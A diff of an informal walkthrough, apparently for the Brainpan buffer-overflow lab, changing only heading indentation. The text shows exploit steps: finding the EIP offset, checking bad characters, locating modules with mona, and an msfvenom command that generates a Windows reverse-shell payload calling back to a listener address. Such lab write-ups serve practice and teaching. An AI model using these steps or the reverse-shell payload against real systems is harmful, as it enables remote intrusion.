@@ -40,19 +40,19 @@ find offset
 [*] Exact match at offset 524
  boom ?? we get Exact Number of size which is 524
 
-		<h2>4. overwriting the EIP</h2>
+<h2>4. overwriting the EIP</h2>
 Now Verify EIP Overwrite or Not By B, add B*4 and check debuger print 42424242 at EIP or not
 ./brainpanEIPWt.py IP PORT
  YES --> ok great
 
-		<h2>5. finding bad characters</h2>
+<h2>5. finding bad characters</h2>
 Now find Bad chars which is use while create shellcode , actual we dont found bad chars in this servers, but dont skip this step go head
 and just do practice ;) 
  ./brainpanBadChard.py IP PORT
 remember how to find Bad chars ? opps no ? dont worry just do hard else catch me on insta i'll explain you :)
 bad chars 
 
-	<h2>6. finding the right modules</h2>
+<h2>6. finding the right modules</h2>
 Downloaded Mona modules ? . no ? download it  --> https://github.com/corelan/mona and add it at exact place
 use command 
 !mona mudules
@@ -70,7 +70,7 @@ make sure its work you controling EIP or not if yes then go head and do shell us
 control EIP done
 
 
-	<h2>7. Generating Shellcode</h2>
+<h2>7. Generating Shellcode</h2>
 now generarte shellcode 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.216 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"(make sure your bad chars)
 
